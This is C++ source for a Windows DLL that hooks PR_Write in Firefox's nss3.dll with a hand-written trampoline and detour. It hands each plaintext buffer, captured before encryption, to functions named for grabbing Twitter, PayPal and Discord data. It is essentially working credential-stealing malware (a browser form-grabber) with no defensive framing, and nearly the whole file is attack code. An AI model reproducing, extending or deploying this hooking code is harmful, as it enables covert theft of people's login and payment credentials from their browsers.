#include	<Windows.h>   
#include    "utils.h"

HANDLE hTfile;
void* ProcAddress;
void Detour(BYTE* src, BYTE* dst, int len);
typedef int (*PR_Write)(void* fd, const void* buf, int amount);
PR_Write old = (PR_Write)(ProcAddress);
BYTE* bytesdata;
BYTE* Trampoline(BYTE* src, BYTE* dst, int len);
using namespace std;


/*
int TestFunction(char* buf, int amount) {
	DWORD written;
	HANDLE hFile = CreateFile(L"PATH\\log.txt", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		MessageBoxA(NULL, "Error", "Error", MB_OK);
		return -1;
	}

	DWORD dwPtr = SetFilePointer(hFile, 0, NULL, FILE_END);
	WriteFile(hFile, buf, amount, &written, NULL);
	CloseHandle(hFile);

	return 0;
}
*/

int HookedPR_Write(void* fd, char* buf, int amount) {
	GetTwitterInfo(buf, amount);
	GetPaypalInfo(buf, amount);
	GetDiscordInfo(buf, amount);
	return old(fd, buf, amount);
}
BYTE* Trampoline(BYTE* src, BYTE* dst, int len) {
	BYTE 	patch[5];
	BYTE* addr = (BYTE*)VirtualAlloc(NULL, len, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	DWORD written;
	memcpy_s(addr, len, src, len);
	uintptr_t gatewayrelative = src - addr - 5;
	memcpy_s(patch, 1, "\xE9", 1);
	*(uintptr_t*)(patch + 1) = gatewayrelative;
	WriteProcessMemory(GetCurrentProcess(), addr + len, patch, 5, &written);
	Detour(src, dst, len);
	return addr;
}
void Detour(BYTE* src, BYTE* dst, int len) {
	BYTE patch[11];
	DWORD written;
	DWORD readed;
	uintptr_t relative_addr = dst - src - 5;
	memcpy_s(patch, 1, "\xE9", 1);
	*(uintptr_t*)(patch + 1) = relative_addr;
	memset(patch + 5, 0x90, len - 5);
	WriteProcessMemory(GetCurrentProcess(), ProcAddress, patch, sizeof(patch), &written);
}


BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	ProcAddress = (void*)GetProcAddress(LoadLibraryA("nss3.dll"), "PR_Write");
	int stopSize = 0;
	while (*((BYTE*)ProcAddress + stopSize) != 0xFF) {
		stopSize++;
	}
	if (ul_reason_for_call == DLL_PROCESS_ATTACH)
	{
		if (ProcAddress != NULL) {
			old = (PR_Write)Trampoline((BYTE*)ProcAddress, (BYTE*)HookedPR_Write, stopSize);
		}
	}
	return TRUE;
}

